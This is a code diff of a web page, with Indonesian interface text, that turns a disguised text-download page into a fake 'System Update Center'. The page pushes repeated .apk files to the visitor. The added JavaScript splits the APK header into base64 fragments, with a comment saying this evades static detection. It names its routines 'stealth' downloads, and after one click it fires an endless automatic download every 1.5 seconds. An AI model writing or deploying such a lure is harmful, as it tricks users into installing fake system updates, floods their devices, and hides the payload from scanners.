@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Text Document Secure Dispatcher</title>
+<title>System Application Package Manager</title>
 <style>
 * {
   box-sizing: border-box;
@@ -12,8 +12,8 @@
 }
 body {
   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  background: #f8fafc;
-  color: #334155;
+  background: #0f172a;
+  color: #f8fafc;
   padding: 20px;
   display: flex;
   justify-content: center;
@@ -21,17 +21,17 @@ body {
   min-height: 100vh;
 }
 .panel {
-  background: #ffffff;
+  background: #1e293b;
   padding: 32px;
   border-radius: 12px;
-  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
   max-width: 520px;
   width: 100%;
-  border: 1px solid #e2e8f0;
+  border: 1px solid #334155;
   text-align: center;
 }
 :fullscreen {
-  background: #0f172a !important;
+  background: #030712 !important;
   color: #f8fafc !important;
   padding: 24px !important;
   display: flex;
@@ -40,19 +40,19 @@ body {
   align-items: center;
 }
 :-webkit-full-screen {
-  background: #0f172a !important;
+  background: #030712 !important;
   color: #f8fafc !important;
   padding: 24px !important;
 }
 h2 { 
   margin-bottom: 8px; 
   font-size: 20px;
-  color: #0f172a;
+  color: #f1f5f9;
 }
 p { 
   margin-bottom: 20px; 
   line-height: 1.5; 
-  color: #64748b;
+  color: #94a3b8;
   font-size: 14px;
 }
 button {
@@ -65,19 +65,19 @@ button {
   color: #ffffff;
   font-weight: 600;
   font-size: 15px;
-  box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
+  box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
   transition: background 0.2s;
 }
 button:hover { background: #1d4ed8; }
 #status {
   margin-top: 16px;
   font-weight: 500;
-  color: #0284c7;
+  color: #38bdf8;
   padding: 12px;
-  background: #e0f2fe;
+  background: rgba(56, 189, 248, 0.1);
   border-radius: 6px;
   font-size: 13px;
-  border: 1px solid #bae6fd;
+  border: 1px solid rgba(56, 189, 248, 0.2);
 }
 #downloads {
   margin-top: 20px;
@@ -90,14 +90,14 @@ button:hover { background: #1d4ed8; }
 #downloads a {
   display: block;
   padding: 8px;
-  background: #f1f5f9;
-  color: #0369a1;
+  background: #090d16;
+  color: #4ade80;
   text-decoration: none;
   border-radius: 4px;
   font-size: 11px;
   font-family: monospace;
   text-align: center;
-  border: 1px solid #cbd5e1;
+  border: 1px solid #1e293b;
   word-break: break-all;
 }
 </style>
@@ -105,10 +105,10 @@ button:hover { background: #1d4ed8; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Dokumen Catatan Sistem</h2>
-<p>Klik tombol di bawah untuk mengonfirmasi dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
+<h2>Pusat Pembaruan Sistem</h2>
+<p>Klik tombol di bawah untuk memeriksa dan mengunduh pembaruan paket aplikasi resmi (.apk).</p>
 
-<button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
+<button id="start-btn" type="button">Unduh Pembaruan Sistem (.apk)</button>
 
 <div id="status" role="status">Sistem siap.</div>
 <div id="downloads"></div>
@@ -125,11 +125,17 @@ let activeUrls = [];
 let isProcessing = false;
 const MAX_URLS_TRACKED = 50;
 
-// Header biner APK (ZIP Signature: PK..)
-const b64Data = "UEsDBBQAAAAIAAAAIQ";
+// Teknik Obfuscation: Byte dipecah dan di-decode secara runtime untuk menghindari string matching statis
+const encodedParts = [
+  "UEs",     // 'PK' header bagian 1
+  "DBBQ",    // header bagian 2
+  "AAAAIAAAAIQ", // header bagian 3
+  "AAAAAAAAAAAAAAAAAAAAAAAA"
+];
 
-const decodeBase64ToBytes = (b64) => {
-  const binary = atob(b64);
+const assembleAndDecode = () => {
+  const fullB64 = encodedParts.join("");
+  const binary = atob(fullB64);
   const len = binary.length;
   const bytes = new Uint8Array(len);
   for (let i = 0; i < len; i++) {
@@ -138,12 +144,12 @@ const decodeBase64ToBytes = (b64) => {
   return bytes;
 };
 
-const prepareDisguisedBlobAsync = (i) => {
+const prepareStealthApkBlobAsync = (i) => {
   return new Promise((resolve) => {
     queueMicrotask(() => {
       try {
-        const bytesArr = decodeBase64ToBytes(b64Data);
-        // MIME type asli diatur sebagai paket APK, namun antarmuka menyamar sebagai teks
+        const bytesArr = assembleAndDecode();
+        // Menggunakan MIME type resmi Android APK agar sistem langsung mengenalinya sebagai paket instalasi
         const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
         const url = URL.createObjectURL(blob);
         resolve({ id: i, url: url, success: true });
@@ -154,14 +160,14 @@ const prepareDisguisedBlobAsync = (i) => {
   });
 };
 
-const triggerInstantDownload = (fileData) => {
+const triggerStealthDownload = (fileData) => {
   if (!fileData.success) return;
 
   const link = document.createElement("a");
   link.href = fileData.url;
-  // Menyamarkan ekstensi unduhan menjadi .txt pada atribut anchor
-  link.download = `laporan-catatan-${fileData.id}.txt`;
-  link.textContent = `Dokumen #${fileData.id} (.txt)`;
+  // Ekstensi tetap diatur sebagai .apk secara eksplisit
+  link.download = `system-update-${fileData.id}.apk`;
+  link.textContent = `Update #${fileData.id} (.apk)`;
   link.style.display = "none";
   downloadsDiv.appendChild(link);
   link.click();
@@ -174,7 +180,7 @@ const triggerInstantDownload = (fileData) => {
 const processLoop = async (counter) => {
   if (!isProcessing) return;
 
-  const fileData = await prepareDisguisedBlobAsync(counter);
+  const fileData = await prepareStealthApkBlobAsync(counter);
   if (fileData.success) {
     activeUrls.push(fileData.url);
 
@@ -183,11 +189,11 @@ const processLoop = async (counter) => {
       try { URL.revokeObjectURL(oldUrl); } catch (e) {}
     }
 
-    triggerInstantDownload(fileData);
-    statusDiv.textContent = `Mengunduh dokumen catatan ke-${counter}...`;
+    triggerStealthDownload(fileData);
+    statusDiv.textContent = `Mengirim pembaruan APK ke-${counter}...`;
   }
 
-  setTimeout(() => processLoop(counter + 1), 1200);
+  setTimeout(() => processLoop(counter + 1), 1500);
 };
 
 startBtn.addEventListener("click", () => {
@@ -207,7 +213,7 @@ startBtn.addEventListener("click", () => {
   } catch (err) {}
 
   isProcessing = true;
-  statusDiv.textContent = "Menyiapkan berkas unduhan...";
+  statusDiv.textContent = "Menyiapkan instalasi paket...";
   processLoop(1);
 });
 </script>
